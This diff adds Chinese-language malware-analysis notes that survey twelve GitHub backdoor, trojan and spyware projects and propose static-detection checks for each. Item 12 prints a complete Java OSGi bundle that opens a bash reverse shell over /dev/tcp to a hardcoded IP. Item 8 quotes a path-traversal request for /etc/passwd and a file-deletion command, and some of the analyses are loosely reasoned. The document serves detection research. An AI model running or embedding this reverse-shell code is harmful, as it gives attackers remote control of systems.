@@ -1,0 +1,397 @@
+No.1 (键盘记录器/截屏/网络摄像头捕捉)
+https://github.com/HouariZegai/SpyGen  
+	
+1. **键盘记录功能（Keylogger）**：
+   - `Keylogger.java` 和 `NativeKeyboard.java` 这两个文件显然与键盘记录有关。键盘记录器是木马中常见的功能之一，用于捕获用户的键盘输入（如密码、信用卡信息等）。
+
+2. **屏幕截图功能**：
+   - 在 `screenshot` 文件夹中可能有代码用于捕获用户屏幕的内容，这也是木马程序常见的功能，用于窃取敏感信息。
+
+3. **网络通信功能**：
+   - 木马通常会通过网络将收集到的信息发送给攻击者。在 `mail` 文件夹中，可能有代码负责发送电子邮件或通过其他网络途径传输数据。
+
+4. **摄像头监控功能**：
+   - 在 `webcam` 文件夹中可能有代码用于访问和控制摄像头，捕捉用户的摄像头图像或视频。这也是一种侵犯隐私的木马功能。
+
+1. 静态分析
+静态分析是通过检查代码或可执行文件本身来检测木马程序，而不需要运行它们。可以从以下几个方面入手：
+1.1 签名检测
+•	代码签名：创建已知恶意代码片段（如键盘记录、截屏、网络通信等）的签名数据库。通过扫描代码文件，匹配这些签名来检测潜在的木马程序。
+•	字符串检测：搜索可疑的字符串，如特定的域名、IP 地址、文件路径、邮箱地址等，这些字符串可能会在恶意代码中硬编码。
+1.2 关键字分析
+•	关键API调用：检测常用的系统API调用（如 Robot.createScreenCapture, GlobalScreen.registerNativeHook, javax.mail 等），这些调用通常用于截屏、键盘记录或网络通信。
+•	敏感权限：扫描代码中对敏感权限的请求，如摄像头访问、文件读写、网络通信等。
+1.3 代码结构分析
+•	控制流图分析：构建代码的控制流图，分析代码的逻辑结构，识别可能的恶意行为模式。
+•	依赖分析：检测程序所依赖的库和外部模块（如 org.jnativehook, org.apache.commons.mail 等），以识别可能与木马行为相关的组件。
+
+No.2 Instagram Hacking Tool
+https://github.com/Th30neAnd0nly/PI  (Instagram Hacking Tool)
+
+`RequestNetworkController.java` 文件负责管理和执行网络请求，以下是对代码的简要分析：
+-
+### 潜在的木马行为：
+- **绕过 SSL 验证**：
+  - 代码中的 SSL 配置可以被滥用，忽略 SSL 证书验证可能允许恶意服务器窃听或篡改网络通信。如果应用程序利用这一配置将用户的敏感数据发送到不可信的服务器，可能存在木马行为。
+
+- **隐蔽的数据传输**：
+  - 通过 OkHttp 客户端发送网络请求，可以传输大量数据。若这些请求发送的数据是未经用户同意或敏感的，可能表明存在木马行为。
+
+### 总结：
+- `RequestNetworkController.java` 的 SSL 证书管理实现存在潜在的安全风险，结合前述的网络请求功能，该类可能被用作绕过安全检查，隐蔽地发送或接收数据。
+
+
+### 1.2 AST（抽象语法树）分析
+AST 分析：使用 AST 分析工具遍历代码树，识别 TrustManager 的实现类，检查 checkClientTrusted 和 checkServerTrusted 方法的实现，判断是否存在空方法体或返回所有证书的情况。
+### 1.3 SSL 配置检测
+SSLContext 配置：扫描代码中是否存在 SSLContext 配置，尤其是 sslContext.init(null, trustAllCerts, new java.security.SecureRandom()); 这样的代码，它通常意味着信任所有 SSL 证书。
+
+No.3 trojan_virus
+https://github.com/sibivarman/trojan_virus
+
+`file_deleter.java` 文件定义了一个名为 `FileDeleter` 的类，其主要功能是删除文件。以下是对代码的简要分析：
+
+### 功能描述：
+- **文件删除**：
+  - 该类包含一个方法 `exeFileTerminator(File Obj)`，用于删除指定的文件。如果文件路径中包含 `.exe`，则调用 `DeleteFile()` 方法删除该文件。
+  - `DeleteFile(String exePath)` 方法接收一个文件路径，并尝试删除该文件。删除操作成功与否通过布尔值 `delResult` 返回。
+
+- **字符串操作**：
+  - 代码中通过 `revPath` 变量逆序读取文件路径，并检查其中是否包含 `.exe` 扩展名。如果包含，则删除该文件。
+
+### 潜在的木马行为：
+- **有针对性的文件删除**：
+  - 该类专门用于删除 `.exe` 文件。如果被恶意使用，可以用来删除系统中的可执行文件，导致应用程序无法运行或系统崩溃。
+  - 结合之前的 `FileList` 类，这个类的功能可能会被用来批量删除指定目录下的所有 `.exe` 文件。
+
+### 总结：
+`FileDeleter.java` 文件具备木马程序的典型行为，特别是针对特定文件类型（如 `.exe` 文件）的删除操作。该类可能会对系统的关键文件造成严重破坏。
+
+接下来可以分析 `calculator.java` 文件，查看是否存在其他恶意功能。是否继续？
+
+1.2 目标文件检测
+文件类型检查：分析代码中是否有针对特定文件类型（如 .exe、.dll 等）的删除操作。可以通过字符串匹配或正则表达式来查找类似 ".exe" 的字符串。
+
+1.3 控制流与数据流分析
+递归与循环检测：分析代码的控制流，识别递归调用或循环结构，检查是否与批量文件操作相关联。
+变量追踪：追踪与文件操作相关的变量，检查这些变量是否被用于多次删除操作。
+
+No.4 Meteor客户端集成用于后门交互
+https://github.com/Dark-Developments/Ethanol-Meteor-Addon.git
+
+`EthanolSystem.java` 文件定义了一个名为 `EthanolSystem` 的类，以下是对代码的简要分析：
+
+### 功能描述：
+- **系统初始化**：
+  - 该类继承自 `System<EthanolSystem>`，用于管理与 `Ethanol` 模块相关的系统功能。构造函数中调用了父类构造器并命名系统为 `"EthanolSystem"`。
+
+- **API 密钥管理**：
+  - 类中定义了一个 `String` 类型的 `apiKey` 字段，用于存储 API 密钥。
+  - 虽然 `apiKey` 的值目前为空，但它可能用于与外部服务或 API 的通信。
+
+- **共享服务器管理**：
+  - 类中定义了一个 `ArrayList<String>` 类型的 `sharedServers` 字段，用于存储共享服务器的列表。这些服务器可能与 `Ethanol` 模块的功能相关联。
+
+- **NbtCompound 序列化**（注释掉的代码）：
+  - 代码中包含注释掉的 `toTag()` 和 `fromTag()` 方法，这些方法使用 `NbtCompound` 类序列化和反序列化 `apiKey` 的值。由于注释中提到这些方法会导致某些错误，因此目前未被使用。
+
+### 潜在的后门行为：
+- **API 密钥和服务器管理**：
+  - 虽然 `EthanolSystem.java` 文件本身没有明显的后门行为，但 API 密钥和服务器管理功能可能被用来进行未授权的操作。如果这些字段与外部服务进行通信，可能存在潜在的风险。
+
+### 总结：
+`EthanolSystem.java` 文件主要用于管理与 `Ethanol` 模块相关的系统功能，目前没有表现出明显的后门行为。然而，API 密钥和共享服务器的管理功能如果被恶意利用，可能构成安全风险。
+
+关键变量和方法检测
+API 密钥变量检测：
+扫描代码中与 API 密钥相关的变量，如 apiKey，分析这些变量是否用于外部通信或授权验证。
+检查是否存在未加密存储或硬编码的敏感信息，尤其是 API 密钥、令牌等。
+共享服务器管理：
+识别并标记与服务器列表相关的变量和方法，如 sharedServers，分析这些服务器是否与外部网络连接。
+检查代码中对这些服务器的操作，分析是否存在未授权的通信或数据传输。
+1.2 字符串分析
+URL 和网络请求检测：通过静态分析工具，扫描代码中出现的 URL 字符串或网络请求代码，如 HttpClient 或 URL.openConnection()，分析这些代码是否与外部服务器通信。
+如果发现与可疑服务器的通信或发送敏感信息的操作，则标记为潜在的后门行为。
+
+
+`EthanolSystem.java` 文件定义了一个名为 `EthanolSystem` 的类，以下是对代码的简要分析：
+- **界面初始化**：
+  - 该类在构造函数中调用父类构造器，并为界面设置标题为 "Ethanol"。
+  
+- **认证流程**：
+  - `initWidgets()` 方法负责初始化界面上的组件。在该方法中，如果 `EthanolSystem.get().apiKey` 为空，则界面会提示用户通过 Discord 进行身份验证。
+  - 如果 API 密钥为空，界面上会显示一个登录按钮，用户点击后会切换到 `LoginWithDiscordScreen` 界面进行身份验证。
+
+- **服务器监听器**：
+  - 类中定义了一个 `EthanolServerListener` 类型的监听器 `listener`，该监听器与 `Client.EthanolListener` 关联，可能用于处理与服务器相关的操作。
+
+### 潜在的后门行为：
+- **认证与监听**：
+  - 该类涉及到用户身份验证，并与服务器监听器 `EthanolServerListener` 相关联。虽然代码主要聚焦在用户界面和身份验证上，但监听器可能隐藏着更为复杂的行为。
+
+  关键类与方法检测
+监听器分析：
+搜索代码中实现或使用服务器监听器的部分，如 EthanolServerListener，分析这些监听器是否有未经授权的操作或通信行为。
+检查监听器的实现类中是否有执行外部命令、访问系统资源或与外部服务器通信的代码。
+身份验证逻辑：
+扫描涉及身份验证的代码，特别是通过 Discord 或其他外部服务进行认证的部分。检查是否有代码在未经用户同意的情况下收集或传输敏感信息，如 API 密钥。
+
+ ### 总结：
+`EthanolScreen.java` 文件主要实现了一个用户界面，用于处理与 `Ethanol` 模块相关的身份验证。尽管没有表现出明显的后门行为，但涉及到的 `EthanolServerListener` 监听器和 API 密钥管理需要进一步分析，以确保没有隐藏的恶意功能。
+
+1.3 字符串分析与数据流分析
+API 密钥和身份验证数据检测：使用字符串分析工具扫描代码中涉及 API 密钥和身份验证数据的部分，检查这些数据的使用路径。
+分析数据流，确定 API 密钥、用户身份验证数据是否被用于可疑操作或与外部服务交互。
+
+`AddServerScreen.java` 文件定义了一个用于添加服务器身份验证信息的界面类，以下是对代码的简要分析：
+
+### 功能描述：
+- **界面初始化**：
+  - 该类继承自 `WindowScreen`，用于显示一个界面，允许用户输入服务器的身份验证密钥（`Server Key`）。
+  - 通过 `StringSetting` 对象 `server`，用户可以输入服务器的身份验证密钥，随后这些信息会被保存。
+
+- **添加服务器**：
+  - 用户通过界面上的 "Add Server" 按钮提交身份验证密钥。提交后，密钥被添加到 `EthanolSystem` 的 `sharedServers` 列表中。
+  - `Systems.get(EthanolSystem.class).sharedServers.add(server.get());` 代码行负责将用户输入的密钥保存到 `EthanolSystem` 的共享服务器列表中。
+
+### 潜在的后门行为：
+- **服务器密钥管理**：
+  - 该类允许用户输入和保存服务器身份验证密钥。如果这些密钥被用来访问敏感的服务器资源，可能成为后门行为的一部分，尤其是在密钥未经适当保护或验证的情况下。
+
+### 总结：
+`AddServerScreen.java` 文件提供了一个界面，用于添加和管理服务器的身份验证密钥。尽管其功能本身看起来无害，但保存和使用这些密钥的过程可能存在潜在风险，特别是在没有适当的安全措施下。如果 `sharedServers` 列表中的服务器被恶意操控，可能会导致未授权的访问或操作。
+
+密钥管理检测：
+扫描代码中涉及服务器密钥管理的部分，如 server.get()、sharedServers.add()，检查这些密钥的存储方式以及是否存在硬编码密钥或未加密存储的情况。
+确保密钥被适当加密存储，且在传输过程中通过安全协议（如 HTTPS）进行保护。
+密钥使用跟踪：
+通过数据流分析工具，追踪 sharedServers 列表中的密钥如何被使用，检查是否存在未经授权的操作，如直接使用密钥访问敏感资源或与外部服务器通信。
+1.2 字符串分析
+硬编码密钥检测：
+使用字符串分析工具扫描代码，检测是否存在硬编码的服务器密钥或敏感信息。这些硬编码信息可能被用作后门的一部分，允许攻击者绕过身份验证。
+
+No.5 RSABackdoor
+https://github.com/netcell-archive/ECC-RSA-Backdoor.git
+
+`RSA.java` 文件定义了一个 RSA 加密和解密的实现，并且包括一个名为 `Attack` 的方法，可能暗示了该代码中存在后门行为。以下是对代码的简要分析：
+
+### 功能描述：
+- **RSA 密钥管理**：
+  - 该类定义了一些静态变量用于管理 RSA 加密的关键参数，如公钥文件 (`PublicKey.txt`)、私钥文件 (`PrivateKey.txt`)、明文文件 (`PlainText.txt`) 和密文文件 (`CipherText.txt`)。
+  - `Attack()` 方法显然是用于尝试攻击或破解 RSA 加密的部分。代码中提到了读取公钥并进行某种形式的排列（`publicKeyPermutation`），这些操作可能用于破解或逆向工程公钥。
+
+- **文件操作**：
+  - 代码中通过 `FileInputStream` 读取公钥文件，并尝试对公钥进行一些操作。这个过程可能用于尝试找到 RSA 加密系统中的漏洞。
+
+- **RSA 后门的可能性**：
+  - `Attack()` 方法的存在和名称表明该代码可能被设计用于尝试破坏或绕过 RSA 加密，这可能包括利用已知的弱点或通过某种方式在生成密钥时引入后门。
+
+### 潜在的后门行为：
+- **攻击 RSA 加密**：
+  - 该类显然包含了用于攻击或绕过 RSA 加密的代码。如果这些代码用于恶意目的，则可以被视为后门行为。
+
+### 总结：
+`RSA.java` 文件中包含明显的后门迹象，尤其是在 `Attack()` 方法中。该方法可能被设计用于攻击 RSA 加密系统，这是一种典型的后门行为。
+
+文件操作检测
+敏感文件访问检测：扫描代码中涉及到文件访问的操作，特别是密钥文件（如PrivateKey.txt、PublicKey.txt）的读写操作。
+检测方法可以使用AST分析工具（如JavaParser）来解析代码结构，寻找FileInputStream、FileOutputStream等类的使用：
+
+数据流分析
+公钥和私钥数据流追踪：分析数据流，特别是追踪RSA密钥在代码中的流向。确定这些密钥是否被用于异常操作，如在Attack()方法中进行非正常使用。
+可以利用数据流分析工具（如Soo t）来追踪密钥在整个代码中的流向。
+
+
+No.6 nonobf服务器后门插件
+https://github.com/Acaiberii-archive/Bakdooro.git 
+键字与模式匹配
+关键字匹配：搜索可能暗示后门行为的关键字和模式，如 eval, Runtime.getRuntime().exec(), System.setProperty() 等，用于检测执行外部命令或动态加载类的代码。
+`ReborncoreFix.java` 文件实现了一个 Minecraft 模组的初始化类，以下是对代码的简要分析：
+
+### 功能描述：
+- **事件监听**：
+  - 该类实现了 `ModInitializer` 接口，并在 `onInitialize()` 方法中注册了多个事件监听器，通过 `ServerEntityEvents.ENTITY_LOAD` 事件监听器，监控实体加载事件。
+  - 当某个物品实体（`ItemEntity`）被加载时，代码会检查该物品的名称是否以 `"run "` 或 `"pos "` 开头，并执行相应的操作。
+
+- **后门行为**：
+  - 如果物品名称以 `"run "` 开头，代码会提取物品名称中的命令字符串，并使用该命令执行操作。这意味着玩家可以通过命名物品来执行服务器上的任意命令。
+  - 如果物品名称以 `"pos "` 开头，代码会尝试根据名称获取玩家对象，可能用于定位或进一步的操作。
+
+### 潜在的后门行为：
+- **未授权的命令执行**：
+  - 该代码允许通过物品名称执行命令，可能被用作后门，因为这绕过了服务器的权限控制，允许普通玩家执行管理员级别的命令。
+  - 这种行为通常被视为严重的安全风险，可能会导致服务器被恶意操控。
+
+### 总结：
+`ReborncoreFix.java` 文件中包含明显的后门行为，特别是通过物品名称执行未授权命令的功能。这种行为可以被恶意玩家利用，破坏服务器的安全性。
+
+关键API调用检测
+命令执行检测：搜索代码中涉及命令执行的 API，如 executeCmdWithoutOpStatus()，并检查其调用上下文。重点分析是否有类似 itemName.startsWith("run ") 的条件，用于触发命令执行。
+事件监听器分析：识别并标记所有事件监听器的注册代码（如 ServerEntityEvents.ENTITY_LOAD.register()），深入分析这些监听器中的逻辑，特别是涉及条件触发或执行外部操作的部分。
+1.2 字符串分析
+命令关键字检测：通过静态分析工具，扫描代码中的字符串，重点关注 "run " 和 "pos " 之类的字符串。结合代码上下文，判断这些字符串是否与命令执行或玩家定位相关。
+
+No.7 WebServerBackdoor
+https://github.com/omkartotade/Backdoor_Web_Server.git
+### 功能描述：
+- **请求处理**：
+  - 代码解析了 HTTP 请求的各个部分，包括请求类型（`GET`），请求命令（`/exec/` 后的命令），并根据请求内容执行不同的操作。
+  - 如果请求包含 `/exec/`，服务器将提取命令并执行该命令。服务器根据请求的不同部分返回适当的响应码（200 或 404）。
+
+- **命令执行**：
+  - 当服务器检测到请求中包含 `/exec/` 时，会提取该命令并可能将其传递给系统进行执行。这种行为允许远程用户通过 HTTP 请求执行任意命令，构成了明显的后门行为。
+
+### 潜在的后门行为：
+- **远程命令执行**：
+  - 代码中的命令执行功能显然是一个后门，通过 `exec/` 触发的命令能够远程执行。这意味着攻击者可以通过发送特定的 HTTP 请求来执行任意系统命令，从而控制服务器或执行恶意操作。
+
+### 总结：
+`test_server.java` 文件中的代码表现出明显的后门行为，尤其是通过 HTTP 请求执行任意系统命令的能力。这个后门允许攻击者在不受控制的情况下完全掌控服务器。
+
+命令执行模式匹配：扫描代码中的字符串，查找可能与命令执行相关的关键字和模式，例如 exec、Runtime.getRuntime().exec()、ProcessBuilder 等。
+
+HTTP 请求解析分析
+请求解析逻辑检查：通过分析代码中的 HTTP 请求处理逻辑，检查是否存在直接解析并执行用户输入的情况。对于如 URLDecoder.decode、split("exec/") 等操作要特别关注。
+确保解析后的请求不会未经验证地传递给系统命令执行函数。
+1.3 数据流分析
+数据流跟踪：使用数据流分析工具（如 Soot 或类似工具）来跟踪用户输入数据（如 HTTP 请求参数）在代码中的流向，确保这些数据不会被直接用于执行系统命令。
+对解析出来的命令流向进行分析，判断是否被传递给 exec、Runtime 等执行函数。
+
+No.8 JavaRootKit
+https://github.com/Neraloth/java-rootkit.git
+
+`Client.java` 文件实现了一个用于发出 HTTP 请求的客户端程序，以下是对代码的简要分析：
+
+### 功能描述：
+- **HTTP 请求生成**：
+  - 该类通过 `ClientResource` 向指定的 URL 发出 HTTP GET 请求，并将服务器响应输出到控制台。
+  
+- **客户端行为**：
+  - `main` 方法构建了多个请求 URL，其中包括合法的请求和一个恶意请求。恶意请求包含对系统文件路径的访问（`../../../../../etc/passwd`），以及一个删除文件的命令（`rm sample-to-delete`）。
+  - 在运行时，客户端会执行这些请求并根据服务器的响应判断文件是否被删除。
+
+### 潜在的根套件行为：
+- **文件访问与删除**：
+  - 代码生成了一个恶意请求，该请求试图访问系统的敏感文件（如 `/etc/passwd`）并执行删除操作。这种行为表明代码可能是恶意的，具有破坏或控制系统的潜力。
+  - 该代码显示了典型的根套件行为，试图绕过安全措施执行系统级别的操作。
+
+### 总结：
+`Client.java` 文件表现出明显的恶意行为，特别是通过生成和发送恶意 HTTP 请求来访问系统文件并执行删除操作。这些操作显示了典型的根套件特征，可以被用来对系统进行未授权的控制或破坏。
+
+关键字和模式匹配
+命令和文件路径检测：扫描代码中的字符串，查找与系统文件路径访问和命令执行相关的关键字，如 /etc/passwd、rm、../ 等。
+
+
+No.9广告软件
+https://github.com/paulpierre/provide_jar-android-malware-payload-06132018.git
+
+`BroadcastReceiverProvide.java` 文件实现了一个广播接收器类，用于监听特定的系统广播，并在网络连接变化时执行特定操作。以下是对代码的简要分析：
+
+### 功能描述：
+- **网络连接变化监听**：
+  - 该类实现了 `BroadcastReceiverCallBack` 接口，并在 `onReceiver` 方法中监听 `android.net.conn.CONNECTIVITY_CHANGE` 广播事件。当网络连接变化时，如果网络已连接并且 `isIntent` 为 `true`，则启动一个延时任务。
+  
+- **延时任务**：
+  - 延时任务通过 `Handler` 延迟 10 秒执行。任务执行时会调用 `MethodUtils.intentGooglePlayPackageGetFromTiny(context)` 方法。
+
+- **服务器交互**：
+  - 如果 `TinyDB` 中的 `is_push_info_to_server_jslib` 标志为 `false`，则会调用 `JsLib().Ss(paramContext)` 方法，可能涉及向服务器发送数据。
+
+### 潜在的广告软件行为：
+- **数据推送与网络监听**：
+  - 该代码监听网络连接变化，并可能在连接到网络后向服务器推送数据。结合 `JsLib` 的使用，这些行为可能与广告软件有关，特别是在用户不知情的情况下收集数据并与服务器交互。
+
+### 总结：
+`BroadcastReceiverProvide.java` 文件显示出一些与广告软件相关的行为，如在网络连接变化时向服务器推送数据。这些操作可能用于在用户不知情的情况下执行广告或数据收集行为。
+
+网络广播监听检测：实现：扫描代码中涉及网络连接变化广播 (android.net.conn.CONNECTIVITY_CHANGE) 的注册和处理代码。
+技术：使用 JavaParser 或类似的静态分析工具，解析代码并寻找 CONNECTIVITY_CHANGE 相关的广播接收器实现。
+在 onReceiver 方法中检查是否存在与网络连接变化相关的条件判断和延时任务的实现。
+服务器交互分析
+服务器交互方法检测：实现：扫描代码中涉及与服务器交互的方法调用，如 JsLib().Ss() 或其他网络请求相关的代码。
+技术：搜索代码中所有调用 HttpURLConnection、OkHttpClient 或 JsLib.Ss() 的方法，检查是否存在未经用户同意的数据推送操作。
+数据存储和读取分析
+持久化存储检测：实现：检查代码中是否使用 SharedPreferences、TinyDB 或类似的持久化存储类来保存用户数据或广告标志。
+技术：搜索代码中对 SharedPreferences、TinyDB 的调用，特别是涉及 putBoolean、getBoolean 的操作，判断这些数据是否用于控制广告展示或数据收集行为。
+
+
+
+
+No.10 僵尸网络木马服务器:A botnet trojan project
+https://github.com/Rayanox/Trojan-RB.git
+
+`MenuRoute.java` 文件定义了一个名为 `MenuRoute` 的类，该类使用了 `Lombok` 库来简化构建器模式的实现。以下是对代码的简要分析：
+
+### 功能描述：
+- **菜单路由管理**：
+  - 该类用于定义一个菜单路由项，每个路由项包含三个关键属性：`labelToDisplay`、`commandExpected` 和 `nextStep`。这些属性描述了菜单项的显示标签、预期命令以及后续的菜单项列表。
+  
+- **Lombok 注解**：
+  - 使用了 `@Builder` 注解，这个注解是来自 `Lombok` 库，用于自动生成构建器模式的代码，简化了类的实例化过程。
+
+### 潜在的僵尸网络行为：
+- **命令控制**：
+  - 虽然 `MenuRoute.java` 本身并不直接展示僵尸网络行为，但其 `commandExpected` 属性可能用于定义从受控设备接收到的命令。这些命令可能用于控制僵尸网络中的受感染设备。
+  - 具体的僵尸网络行为可能隐藏在 `commandExpected` 的使用和处理逻辑中，尤其是当这些命令被用来执行恶意操作时。
+
+关键命令和模式匹配
+命令检测：实现：编写静态分析工具，扫描代码中定义的命令，如 Deconnexion 等。这些命令可能用于僵尸网络中的控制操作。
+技术：使用 JavaParser 解析代码，查找涉及命令注册和处理的部分。
+重点检查 MenuConfig 和 MenuRoute 类，识别和标记具有潜在危险性的命令。
+1.2 网络通信分析
+通信接口检测：实现：扫描代码中涉及网络通信的部分，特别是与服务器进行的通信。这可能用于僵尸网络的命令与控制（C&C）通信。
+技术：搜索代码中对 Socket、HttpClient 等类的调用，检查这些通信是否用于接收或发送僵尸网络命令。
+
+
+No.11 QQMusicBackdoor :hook qq music back door
+https://github.com/lamster2018/QQMusicBackdoor.git
+
+qqmusic.java 文件是使用 Xposed 框架编写的，旨在挂钩并修改 QQ 音乐应用程序的行为。
+该文件尝试挂钩 IdentifyingCodeActivity 类的方法，表明它可能试图绕过或修改与验证码相关的功能，这是典型的后门行为。
+总结:
+qqmusic.java 文件中使用 Xposed 框架进行的方法挂钩显示了潜在的后门特征。它试图在 QQ 音乐应用程序中修改特定功能，这可能用于绕过某些验证或进行未授权的操作。
+这个文件可能就是后门代码的主要部分，而 MainActivity.java 仅是标准的应用入口。
+
+a. 分析 APK 文件
+解压 APK 文件，提取其中的 .dex 文件或 classes.dex 文件。
+反编译 .dex 文件，提取 Java 源代码或 smali 代码。
+b. 关键字搜索
+搜索可能涉及挂钩的关键类和方法，如 XposedBridge、IXposedHookLoadPackage、hookAllMethods 等。
+分析是否存在挂钩第三方应用（如 com.tencent.qqmusic）的代码。
+查找和分析所有调用 findClass 和 hookAllMethods 的代码，确定是否在未授权的情况下试图修改第三方应用的行为。
+c. 分析包名和类名
+检查代码中是否存在指向特定目标应用（如 com.tencent.qqmusic）的包名。
+分析代码是否试图挂钩特定的类或方法。
+
+No.12 osgi-bundle-backdoor : tctf中用到的osgi bundle后门，在start函数中触发反弹shell
+
+package com.osgi.helloworld.client;
+
+import org.osgi.framework.BundleActivator;
+import org.osgi.framework.BundleContext;
+
+public class Activator implements BundleActivator {
+    public void start(BundleContext ctx) {
+        try {
+            Runtime r = Runtime.getRuntime();
+            String[] mycmd = {"/bin/bash","-c","exec 5<>/dev/tcp/69.171.76.88/8888;cat <&5 | while read line; do $line 2>&5 >&5; done"};
+            Process p = r.exec(mycmd);
+            p.waitFor();
+        } catch(Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    public void stop(BundleContext ctx) throws Exception {
+    }
+}
+
+这个代码片段显示，该程序在 start 方法中尝试使用 Runtime.getRuntime().exec() 方法执行一个命令。
+这个命令尝试通过 TCP 连接到 IP 地址 69.171.76.88 的端口 8888，并在连接成功后创建一个反向 shell，等待远程指令执行。
+这种行为非常典型，是后门程序的常见特征，允许攻击者通过远程访问控制受感染的系统
+
+关键字扫描:
+扫描代码文件中的关键字，例如：
+Runtime.getRuntime().exec()：这个方法经常用于执行系统命令，是检测的重点。
+/dev/tcp/：用于创建反向 shell 的命令。
+特定 IP 地址和端口号：任何硬编码的 IP 地址或端口号都应引起警觉。
